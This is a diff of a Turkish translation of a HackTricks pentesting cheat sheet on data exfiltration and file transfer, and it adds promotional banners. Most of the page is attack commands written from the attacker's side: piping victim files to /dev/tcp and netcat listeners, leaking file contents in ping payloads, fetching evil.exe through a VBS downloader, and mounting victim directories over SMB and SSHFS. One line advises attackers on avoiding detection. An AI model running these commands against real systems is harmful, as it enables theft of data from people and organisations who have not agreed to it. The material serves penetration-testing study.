@@ -2,23 +2,31 @@
 
 <details>
 
-<summary><strong>htARTE (HackTricks AWS Red Team Expert) ile sıfırdan kahramana kadar AWS hacklemeyi öğrenin</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>
+<summary><strong>AWS hackleme konusunda sıfırdan kahramana dönüşün</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Kırmızı Takım Uzmanı)</strong></a><strong> ile!</strong></summary>
 
 HackTricks'ı desteklemenin diğer yolları:
 
-* **Şirketinizi HackTricks'te reklamını görmek istiyorsanız** veya **HackTricks'i PDF olarak indirmek istiyorsanız** [**ABONELİK PLANLARI**]'na göz atın (https://github.com/sponsors/carlospolop)!
+* **Şirketinizi HackTricks'te reklamını görmek istiyorsanız** veya **HackTricks'i PDF olarak indirmek istiyorsanız** [**ABONELİK PLANLARI**]'na(https://github.com/sponsors/carlospolop) göz atın!
 * [**Resmi PEASS & HackTricks ürünlerini**](https://peass.creator-spring.com) edinin
-* [**The PEASS Family**]'yi (https://opensea.io/collection/the-peass-family) keşfedin, özel [**NFT'lerimiz**]'i (https://opensea.io/collection/the-peass-family) içeren koleksiyonumuz
-* **💬 [**Discord grubuna**](https://discord.gg/hRep4RUj7f) veya [**telegram grubuna**](https://t.me/peass) katılın veya bizi **Twitter** 🐦 [**@hacktricks_live**](https://twitter.com/hacktricks_live)**'da takip edin.**
+* [**PEASS Ailesi'ni**](https://opensea.io/collection/the-peass-family) keşfedin, özel [**NFT'lerimiz**](https://opensea.io/collection/the-peass-family) koleksiyonumuz
+* **Katılın** 💬 [**Discord grubuna**](https://discord.gg/hRep4RUj7f) veya [**telegram grubuna**](https://t.me/peass) veya bizi **Twitter** 🐦 [**@hacktricks_live**](https://twitter.com/hacktricks_live)** takip edin.**
 * **Hacking püf noktalarınızı paylaşarak PR'lar göndererek** [**HackTricks**](https://github.com/carlospolop/hacktricks) ve [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github depolarına katkıda bulunun.
 
 </details>
 
+**Try Hard Güvenlik Grubu**
+
+<figure><img src="../.gitbook/assets/telegram-cloud-document-1-5159108904864449420.jpg" alt=""><figcaption></figcaption></figure>
+
+{% embed url="https://discord.gg/tryhardsecurity" %}
+
+***
+
 ## Bilgi çıkarmak için genellikle izin verilen alan adları
 
-Kötüye kullanılabilen genellikle izin verilen alan adlarını bulmak için [https://lots-project.com/](https://lots-project.com/) adresini kontrol edin
+[https://lots-project.com/](https://lots-project.com/) adresini kontrol ederek kötüye kullanılabilecek genellikle izin verilen alan adlarını bulun
 
-## Kopyala ve Yapıştır Base64
+## Base64 Kopyala ve Yapıştır
 
 **Linux**
 ```bash
@@ -155,7 +163,7 @@ ftp -n -v -s:ftp.txt
 ```
 ## SMB
 
-Sunucu olarak Kali
+Kali olarak sunucu
 ```bash
 kali_op1> impacket-smbserver -smb2support kali `pwd` # Share current directory
 kali_op2> smbserver.py -smb2support name /path/folder # Share a folder
@@ -177,38 +185,23 @@ guest ok = Yes
 #Start samba
 service smbd restart
 ```
-# Exfiltration
+Windows
 
-## Introduction
+---
 
-Exfiltration is the unauthorized transfer of data from a target system. This can be achieved through various methods, such as using command and control (C2) channels, exfiltrating data over DNS, or leveraging legitimate services like Dropbox or Google Drive.
+### Exfiltration
 
-## Techniques
+Exfiltration is the unauthorized transfer of data from a target system. There are various methods to exfiltrate data from a compromised system, including:
 
-### Command and Control (C2) Channels
+1. **Email**: Sending data as email attachments to an external email address.
+2. **FTP**: Transferring data using the File Transfer Protocol to a remote server.
+3. **DNS**: Encoding data within DNS requests to leak information.
+4. **HTTP/HTTPS**: Sending data over HTTP or HTTPS to a remote server.
+5. **Steganography**: Hiding data within images or other files to avoid detection.
+6. **Cloud Storage**: Uploading data to cloud storage services like Dropbox or Google Drive.
+7. **USB Drives**: Physically removing data using USB drives.
 
-C2 channels are commonly used by attackers to exfiltrate data from compromised systems. These channels allow the attacker to maintain control over the compromised system and exfiltrate data without being detected.
-
-### DNS Exfiltration
-
-DNS exfiltration involves encoding data within DNS queries or responses to exfiltrate data from a target network. This technique can be used to bypass network security controls that may not inspect DNS traffic.
-
-### Using Legitimate Services
-
-Attackers may leverage legitimate services like Dropbox, Google Drive, or other cloud storage providers to exfiltrate data from a target system. By using these services, attackers can blend in with legitimate traffic and avoid detection.
-
-## Tools and Resources
-
-There are various tools and resources available to facilitate data exfiltration, including:
-
-- **C2 Frameworks**: Frameworks like Metasploit, Cobalt Strike, and Empire include capabilities for data exfiltration.
-- **DNS Exfiltration Tools**: Tools like Iodine, Dnscat2, and Dnsmessenger can be used for DNS exfiltration.
-- **Cloud Storage Services**: Services like Dropbox, Google Drive, and OneDrive can be leveraged for exfiltrating data.
-- **Custom Scripts**: Custom scripts can be developed to exfiltrate data using specific techniques tailored to the target environment.
-
-## Conclusion
-
-Exfiltration is a critical phase of the cyber attack lifecycle, allowing attackers to steal valuable data from target systems. By understanding exfiltration techniques and utilizing appropriate tools and resources, security professionals can better defend against data exfiltration attempts.
+It is essential for attackers to choose exfiltration methods carefully to avoid detection and successfully transfer the stolen data.
 ```bash
 CMD-Wind> \\10.10.14.14\path\to\exe
 CMD-Wind> net use z: \\10.10.14.14\test /user:test test #For SMB using credentials
@@ -224,7 +217,7 @@ scp <username>@<Attacker_IP>:<directory>/<filename>
 ```
 ## SSHFS
 
-Eğer kurbanın SSH'si varsa, saldırgan kurbanın dizinini saldırgana bağlayabilir.
+Eğer kurbanın SSH'si varsa, saldırgan kurbandan saldırgana bir dizin bağlayabilir.
 ```bash
 sudo apt-get install sshfs
 sudo mkdir /mnt/sshfs
@@ -232,19 +225,19 @@ sudo sshfs -o allow_other,default_permissions <Target username>@<Target IP addre
 ```
 ## NC
 
-NC, or Netcat, is a versatile networking tool that can be used for exfiltration. It can create connections to remote systems, listen for incoming connections, and transfer data between systems. Netcat can be used to exfiltrate data over various protocols such as TCP or UDP.
+NC, veya Netcat, bir ağ aracıdır ve sıkça kullanılan bir exfiltration tekniğidir. Ağ üzerinden veri transferi yapmak için kullanılır. Örneğin, bir hedef makineden veri çalmak veya bir hedef makineye veri yüklemek için kullanılabilir. Netcat'i kullanarak veri transferi yaparken dikkatli olunmalı ve güvenlik önlemleri alınmalıdır.
 ```bash
 nc -lvnp 4444 > new_file
 nc -vn <IP> 4444 < exfil_file
 ```
 ## /dev/tcp
 
-### Kurbanın dosyasını indirin
+### Kurbanın cihazından dosya indir
 ```bash
 nc -lvnp 80 > file #Inside attacker
 cat /path/file > /dev/tcp/10.10.10.10/80 #Inside victim
 ```
-### Kurbanın bilgisayarına dosya yükle
+### Dosyayı hedefe yükle
 ```bash
 nc -w5 -lvnp 80 < file_to_send.txt # Inside attacker
 # Inside victim
@@ -254,6 +247,8 @@ cat <&6 > file.txt
 ## **ICMP**
 
 ## **ICMP**
+
+ICMP, Internet Control Message Protocol, is commonly used for network diagnostics. ICMP exfiltration involves sending data using ICMP packets. This technique can be used to bypass firewalls that only allow specific protocols and ports. ICMP exfiltration can be achieved using tools like **icmpsh** or custom scripts.
 ```bash
 # To exfiltrate the content of a file via pings you can do:
 xxd -p -c 4 /path/file/exfil | while read line; do ping -c 1 -p $line <IP attacker>; done
@@ -273,7 +268,7 @@ sniff(iface="tun0", prn=process_packet)
 ```
 ## **SMTP**
 
-Eğer bir SMTP sunucusuna veri gönderebiliyorsanız, veriyi almak için bir SMTP oluşturabilirsiniz:
+Eğer bir SMTP sunucusuna veri gönderebiliyorsanız, veriyi almak için bir SMTP oluşturabilirsiniz python ile:
 ```bash
 sudo python -m smtpd -n -c DebuggingServer :25
 ```
@@ -345,14 +340,14 @@ cscript wget.vbs http://10.11.0.5/evil.exe evil.exe
 ```
 ## Debug.exe
 
-`debug.exe` programı sadece ikili dosyaların incelenmesine izin vermekle kalmaz, aynı zamanda onları onaltılıktan yeniden oluşturma yeteneğine sahiptir. Bu, bir ikili dosyanın onaltılık bir temsilini sağlayarak `debug.exe`nin ikili dosyayı oluşturabilmesi anlamına gelir. Bununla birlikte, debug.exe'nin **64 kb boyutundaki dosyaları birleştirme sınırlaması olduğunu** unutmamak önemlidir.
+`debug.exe` programı sadece ikili dosyaların incelenmesine izin vermekle kalmaz, aynı zamanda **onları onaltılıktan yeniden oluşturma yeteneğine sahiptir**. Bu, bir ikili dosyanın onaltılık halini sağlayarak `debug.exe`nin ikili dosyayı oluşturabilmesi anlamına gelir. Bununla birlikte, debug.exe'nin **64 kb boyutundaki dosyaları birleştirme sınırı olduğunu** unutmamak önemlidir.
 ```bash
 # Reduce the size
 upx -9 nc.exe
 wine exe2bat.exe nc.exe nc.txt
 ```
-```html
-Sonra metni windows-shell'e kopyalayıp nc.exe adında bir dosya oluşturulacak.
+```markdown
+Ardından metni windows-shell'e kopyalayıp nc.exe adında bir dosya oluşturulacaktır.
 
 * [https://chryzsh.gitbooks.io/pentestbook/content/transfering_files_to_windows.html](https://chryzsh.gitbooks.io/pentestbook/content/transfering_files_to_windows.html)
 
@@ -360,17 +355,22 @@ Sonra metni windows-shell'e kopyalayıp nc.exe adında bir dosya oluşturulacak.
 
 * [https://github.com/62726164/dns-exfil](https://github.com/62726164/dns-exfil)
 
+**Try Hard Security Group**
+
+<figure><img src="../.gitbook/assets/telegram-cloud-document-1-5159108904864449420.jpg" alt=""><figcaption></figcaption></figure>
+
+{% embed url="https://discord.gg/tryhardsecurity" %}
 
 <details>
 
-<summary><strong>AWS hacklemeyi sıfırdan kahraman olmaya öğrenin</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>
+<summary><strong>htARTE (HackTricks AWS Red Team Expert)</strong> ile sıfırdan kahraman olmaya kadar AWS hackleme öğrenin!</summary>
 
 HackTricks'i desteklemenin diğer yolları:
 
-* **Şirketinizi HackTricks'te reklamını görmek istiyorsanız** veya **HackTricks'i PDF olarak indirmek istiyorsanız** [**ABONELİK PLANLARI**]'na bakın(https://github.com/sponsors/carlospolop)!
+* **Şirketinizi HackTricks'te reklamını görmek istiyorsanız** veya **HackTricks'i PDF olarak indirmek istiyorsanız** [**ABONELİK PLANLARI**]'na göz atın (https://github.com/sponsors/carlospolop)!
 * [**Resmi PEASS & HackTricks ürünlerini**](https://peass.creator-spring.com) edinin
-* [**The PEASS Family**](https://opensea.io/collection/the-peass-family) koleksiyonumuzu keşfedin, özel [**NFT'lerimiz**](https://opensea.io/collection/the-peass-family) koleksiyonumuz
-* **Katılın** 💬 [**Discord grubuna**](https://discord.gg/hRep4RUj7f) veya [**telegram grubuna**](https://t.me/peass) veya bizi **Twitter** 🐦 [**@hacktricks_live**](https://twitter.com/hacktricks_live)** takip edin.**
+* [**The PEASS Family**](https://opensea.io/collection/the-peass-family)'yi keşfedin, özel [**NFT'lerimiz**](https://opensea.io/collection/the-peass-family) koleksiyonumuz
+* **💬 [**Discord grubuna**](https://discord.gg/hRep4RUj7f) veya [**telegram grubuna**](https://t.me/peass) katılın veya bizi **Twitter** 🐦 [**@hacktricks_live**](https://twitter.com/hacktricks_live)'da takip edin.**
 * **Hacking püf noktalarınızı paylaşarak PR'lar göndererek** [**HackTricks**](https://github.com/carlospolop/hacktricks) ve [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github depolarına katkıda bulunun.
 
 </details>
